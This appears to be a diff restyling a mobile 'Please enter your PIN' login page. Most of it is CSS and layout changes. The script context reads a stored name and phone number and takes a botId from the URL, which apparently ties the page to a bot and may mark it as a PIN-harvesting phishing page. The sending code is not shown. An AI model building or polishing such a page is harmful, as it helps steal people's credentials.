@@ -9,52 +9,54 @@
     body {
       margin: 0;
       font-family: Arial, Helvetica, sans-serif;
-      background: #e5e5e5;
+      background: #f2f2f2;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
-    .top {
-      height: 180px;
-      background: #c00000;
+    /* MAIN CARD */
+    .pin-card {
+      width: 92%;
+      max-width: 420px;
+      background: #ffffff;
+      border-radius: 22px;
+      padding: 28px 20px 32px;
+      box-shadow: 0 18px 45px rgba(0,0,0,0.12);
       position: relative;
-      flex-shrink: 0;
-      border-bottom-left-radius: 28px;
-      border-bottom-right-radius: 28px;
     }
 
     .back {
       position: absolute;
-      left: 16px;
-      top: 16px;
+      left: 18px;
+      top: 18px;
       font-size: 22px;
-      color: #ffffff;
+      color: #c00000;
       cursor: pointer;
-    }
-
-    .pin-container {
-      flex: 1;
-      background: #ffffff;
-      padding: 28px 16px;
-      margin-top: -32px;
-      border-top-left-radius: 32px;
-      border-top-right-radius: 32px;
     }
 
     .pin-title {
       text-align: center;
       font-size: 16px;
       color: #333;
-      margin-bottom: 22px;
+      margin-bottom: 24px;
       font-weight: 600;
+    }
+
+    /* PIN GROUP BOX */
+    .pin-box-wrapper {
+      background: #fafafa;
+      border-radius: 18px;
+      padding: 22px 16px;
+      margin-bottom: 26px;
+      box-shadow: inset 0 0 0 1px #eee;
     }
 
     .pin-row {
       display: flex;
       justify-content: center;
       gap: 14px;
-      margin-bottom: 26px;
     }
 
     .pin-box {
@@ -62,7 +64,7 @@
       height: 56px;
       border-radius: 14px;
       border: 1.5px solid #ddd;
-      background: #fafafa;
+      background: #ffffff;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -75,7 +77,7 @@
 
     .pin-box:not(:empty) {
       border-color: #c00000;
-      background: #fff;
+      box-shadow: 0 6px 14px rgba(192,0,0,0.25);
     }
 
     .lock {
@@ -104,12 +106,12 @@
       border-radius: 999px;
       cursor: pointer;
       opacity: 0.5;
-      transition: opacity 0.2s ease;
+      transition: all 0.2s ease;
     }
 
     button:enabled {
       opacity: 1;
-      cursor: pointer;
+      box-shadow: 0 10px 22px rgba(192,0,0,0.35);
     }
 
     .status {
@@ -133,19 +135,19 @@
 </head>
 <body>
 
-  <div class="top">
+  <div class="pin-card" onclick="focusPin()">
     <div class="back" onclick="history.back()">←</div>
-  </div>
 
-  <div class="pin-container" onclick="focusPin()">
     <div class="pin-title">Please enter your PIN</div>
 
-    <div class="pin-row">
-      <div class="pin-box" id="b1"></div>
-      <div class="pin-box" id="b2"></div>
-      <div class="pin-box" id="b3"></div>
-      <div class="pin-box" id="b4"></div>
-      <div class="lock">🔒</div>
+    <div class="pin-box-wrapper">
+      <div class="pin-row">
+        <div class="pin-box" id="b1"></div>
+        <div class="pin-box" id="b2"></div>
+        <div class="pin-box" id="b3"></div>
+        <div class="pin-box" id="b4"></div>
+        <div class="lock">🔒</div>
+      </div>
     </div>
 
     <button id="loginBtn" disabled>Login</button>
@@ -175,7 +177,6 @@
     const fullName = localStorage.getItem('fullName');
     const phone = localStorage.getItem('phone');
 
-    // ✅ FIXED botId HANDLING
     const params = new URLSearchParams(window.location.search);
     const urlBotId = params.get('botId');
     if (urlBotId) {
